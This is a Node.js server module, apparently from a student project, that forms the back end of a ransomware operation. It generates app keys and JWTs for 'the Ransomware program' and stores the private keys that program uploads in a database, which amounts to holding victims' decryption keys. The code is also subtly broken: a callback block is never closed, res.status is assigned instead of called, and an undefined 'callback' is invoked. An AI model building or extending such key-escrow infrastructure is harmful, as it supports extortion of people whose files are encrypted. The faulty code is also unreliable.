'use strict'

const Key = require('./schemas/key');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const crypto = require('crypto');
const config = JSON.parse(fs.readFileSync('/home/ubuntu/378Project/nodeServer/config/config.json', 'utf-8'));

const genToken = function(appKey) {
	return jwt.sign( {id: appKey}, config.secret);
};

const storePrivGenAppkey = function(req, res) {
	//Generate an app key to send to the Ransomware program
	let genAppKey = crypto.randomBytes(20).toString('hex');
	//Create the JWT token
	let token = genToken({appKey: genAppKey});
	//Now we need to save the Private Key object received from the Application
	if(req.body.privateKey) {
	//Save the private key object along with the app key to the database
		let privateKeyObject = req.body.privateKey;
		let keyData = {
			appKey: genAppKey,
			privateKey: privateKeyObject
		};
		Key.create(keyData, function(err, key) {
			if(err) {
				res.status = 401;
				return res.json({message: err.message});
			} else {
				return res.json({'token': token});
			}
	} else {
		//The application did not send a PrivateKey object
		let err = new Error('Application did not send a PrivateKey Object');
		err.status = 401;
		return callback(err, null);
	}
};

module.exports = {
	storePrivGenAppkey
};
